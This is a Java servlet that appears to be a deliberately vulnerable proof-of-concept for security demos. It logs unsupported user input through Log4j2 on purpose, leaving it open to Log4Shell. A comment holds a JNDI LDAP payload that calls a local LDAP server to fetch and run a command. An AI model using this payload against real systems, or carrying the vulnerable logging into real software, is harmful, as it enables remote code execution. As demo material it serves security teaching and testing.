package local.ptdemo.appsec.poc.servlet.simple;

import lombok.SneakyThrows;
import lombok.extern.log4j.Log4j2;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.util.regex.Pattern;

@Log4j2
@WebServlet("/simple")
public class Servlet extends HttpServlet {
    @SneakyThrows
    @Override
    protected void doGet(HttpServletRequest request,
                         HttpServletResponse response) {
        // Only ping IP address allowed
        final Pattern pattern = Pattern.compile("^ping \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$");
        String cmd = request.getParameter("cmd");
        if (pattern.matcher(cmd).matches())
            Runtime.getRuntime().exec(cmd);
        else {
            // CVE-2021-44228 (RCE) may be exploited using
            // cmd that equals ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/Y2FsYy5leGU=}
            log.error("Unsupported command: {}", cmd);
        }
    }
}
